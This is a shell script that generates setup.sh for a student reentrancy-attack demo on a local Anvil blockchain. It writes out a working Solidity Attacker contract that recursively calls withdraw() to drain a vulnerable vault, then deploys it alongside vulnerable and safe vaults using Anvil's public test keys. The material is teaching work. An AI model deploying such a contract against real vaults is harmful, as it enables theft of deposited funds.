# cd ~/Desktop/MTech\ AI\ IIT-Jodhpur*/Cohort-2-Trimester-2/Cyber-Security_ES/Assignment-1-Reentrancy-Attack

cat > setup.sh <<'SETUP_EOF'
#!/usr/bin/env bash
# SafeVault Bank — One-Shot Setup Script
# Group 6 · CSL6010 Assignment 1
#
# WHAT THIS DOES:
#   1. Verifies Anvil is running
#   2. Cleans Forge build artifacts (fixes the "expected 1 got 2" bug)
#   3. Rebuilds Attacker.sol with a verified clean source
#   4. Deploys all 4 contracts in correct order
#   5. Writes addresses into safevault-frontend/.env.local
#   6. Prints exact next steps
#
# USAGE: bash setup.sh

set -e

# ───────── Colors ─────────
RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[0;33m'; CYN='\033[0;36m'; NC='\033[0m'

# ───────── Paths ─────────
PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FORGE_DIR="$PROJECT_ROOT/reentrancy-demo"
FRONTEND_DIR="$PROJECT_ROOT/safevault-frontend"

# ───────── Anvil defaults ─────────
RPC="http://127.0.0.1:8545"
DEPLOYER_KEY="0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
EVE_KEY="0x7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6"

VULN_EXPECTED="0x5FbDB2315678afecb367f032d93F642f64180aa3"
SAFE_EXPECTED="0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512"

echo ""
echo -e "${CYN}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYN}║  SafeVault Bank · One-Shot Setup                         ║${NC}"
echo -e "${CYN}║  Group 6 · CSL6010 · Reentrancy Attack Demo              ║${NC}"
echo -e "${CYN}╚══════════════════════════════════════════════════════════╝${NC}"
echo ""

# ───────── 1. Verify Anvil ─────────
echo -e "${YLW}[1/6]${NC} Checking Anvil..."
if ! curl -s -o /dev/null -X POST -H "Content-Type: application/json" \
   -d '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}' \
   "$RPC"; then
  echo -e "${RED}✗ Anvil is NOT running on $RPC${NC}"
  echo -e "${YLW}MANUAL ACTION REQUIRED:${NC}"
  echo "  Open a separate terminal and run:"
  echo "    cd $FORGE_DIR"
  echo "    anvil --chain-id 31337"
  echo "  Then re-run this script."
  exit 1
fi
echo -e "${GRN}✓ Anvil is alive${NC}"

# ───────── 2. Clean rebuild ─────────
echo ""
echo -e "${YLW}[2/6]${NC} Cleaning Forge artifacts..."
cd "$FORGE_DIR"
forge clean > /dev/null 2>&1
rm -rf out cache
echo -e "${GRN}✓ Artifacts cleaned${NC}"

# ───────── 3. Rewrite Attacker.sol from scratch ─────────
echo ""
echo -e "${YLW}[3/6]${NC} Rewriting Attacker.sol (clean source)..."
cat > src/Attacker.sol <<'SOL_EOF'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVault public vault;
    uint256 public stake;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    function attack() external payable {
        stake = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= stake) {
            vault.withdraw();
        }
    }

    function loot() external view returns (uint256) {
        return address(this).balance;
    }
}
SOL_EOF

# Verify single contract
N_CONTRACTS=$(grep -c "^contract " src/Attacker.sol)
N_CONSTRUCTORS=$(grep -c "constructor" src/Attacker.sol)
if [ "$N_CONTRACTS" != "1" ] || [ "$N_CONSTRUCTORS" != "1" ]; then
  echo -e "${RED}✗ Attacker.sol verification failed${NC}"
  echo "  Contracts: $N_CONTRACTS (expected 1)"
  echo "  Constructors: $N_CONSTRUCTORS (expected 1)"
  exit 1
fi
echo -e "${GRN}✓ Attacker.sol clean (1 contract, 1 constructor)${NC}"

# ───────── 4. Force rebuild ─────────
echo ""
echo -e "${YLW}[4/6]${NC} Force-rebuilding contracts (this may take 30s)..."
forge build --force > /tmp/forge-build.log 2>&1 || {
  echo -e "${RED}✗ Build failed. Log:${NC}"
  tail -20 /tmp/forge-build.log
  exit 1
}
echo -e "${GRN}✓ Build successful${NC}"

# ───────── 5. Deploy contracts ─────────
echo ""
echo -e "${YLW}[5/6]${NC} Deploying contracts to Anvil..."

deploy() {
  local NAME="$1"; local PATH_SPEC="$2"; local KEY="$3"; local ARGS="$4"
  local CMD="forge create $PATH_SPEC --rpc-url $RPC --private-key $KEY --broadcast"
  [ -n "$ARGS" ] && CMD="$CMD --constructor-args $ARGS"
  local OUT
  OUT=$(eval "$CMD" 2>&1) || { echo -e "${RED}✗ $NAME failed:${NC}"; echo "$OUT"; exit 1; }
  local ADDR
  ADDR=$(echo "$OUT" | grep "Deployed to:" | awk '{print $3}')
  echo -e "  ${GRN}✓${NC} $NAME → ${CYN}$ADDR${NC}"
  echo "$ADDR"
}

VULN_ADDR=$(deploy "VulnerableVault" "src/VulnerableVault.sol:VulnerableVault" "$DEPLOYER_KEY" "" | tail -1)
SAFE_ADDR=$(deploy "SafeVault       " "src/SafeVault.sol:SafeVault"             "$DEPLOYER_KEY" "" | tail -1)
ATTACKER_V=$(deploy "Attacker (vuln) " "src/Attacker.sol:Attacker"               "$EVE_KEY" "$VULN_ADDR" | tail -1)
ATTACKER_S=$(deploy "Attacker (safe) " "src/Attacker.sol:Attacker"               "$EVE_KEY" "$SAFE_ADDR" | tail -1)

# Sanity check that vault addresses match expected Anvil-deterministic values
if [ "$VULN_ADDR" != "$VULN_EXPECTED" ]; then
  echo ""
  echo -e "${YLW}⚠  Warning:${NC} VulnerableVault deployed to a non-default address."
  echo "   Got:      $VULN_ADDR"
  echo "   Expected: $VULN_EXPECTED"
  echo "   This means Anvil's nonce was non-zero. Your .env will use the new addresses."
fi

# ───────── 6. Write .env.local ─────────
echo ""
echo -e "${YLW}[6/6]${NC} Writing $FRONTEND_DIR/.env.local..."
cat > "$FRONTEND_DIR/.env.local" <<ENV_EOF
NEXT_PUBLIC_VULN_ADDRESS=$VULN_ADDR
NEXT_PUBLIC_SAFE_ADDRESS=$SAFE_ADDR
NEXT_PUBLIC_ATTACKER_VULN=$ATTACKER_V
NEXT_PUBLIC_ATTACKER_SAFE=$ATTACKER_S
NEXT_PUBLIC_RPC_URL=$RPC
ENV_EOF
echo -e "${GRN}✓ .env.local written${NC}"

# ───────── DONE ─────────
echo ""
echo -e "${GRN}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${GRN}║  ✓ Setup Complete                                        ║${NC}"
echo -e "${GRN}╚══════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYN}Deployed addresses:${NC}"
echo "  VulnerableVault : $VULN_ADDR"
echo "  SafeVault       : $SAFE_ADDR"
echo "  Attacker (vuln) : $ATTACKER_V"
echo "  Attacker (safe) : $ATTACKER_S"
echo ""
echo -e "${YLW}MANUAL STEPS NOW REQUIRED:${NC}"
echo ""
echo "  1. In MetaMask:"
echo "     - Click extension icon → ⋮ → Settings → Advanced"
echo "     - Click 'Clear activity tab data' → Confirm"
echo "     - Switch to Alice (0x70997970...c79C8)"
echo ""
echo "  2. In a NEW terminal, start the Next.js dev server (if not running):"
echo "       cd $FRONTEND_DIR"
echo "       npm run dev"
echo ""
echo "  3. In Chrome: open http://localhost:3000 and hit Cmd-R to reload"
echo ""
echo "  4. Click 'Connect MetaMask' → confirm with Alice"
echo "     → Click 'Deposit 5 ETH' → Confirm in MetaMask popup"
echo "     → Vault balance should jump to 5.000 ETH"
echo ""
echo -e "${CYN}Done.${NC}"
SETUP_EOF

chmod +x setup.sh
echo "Script created at: $(pwd)/setup.sh"
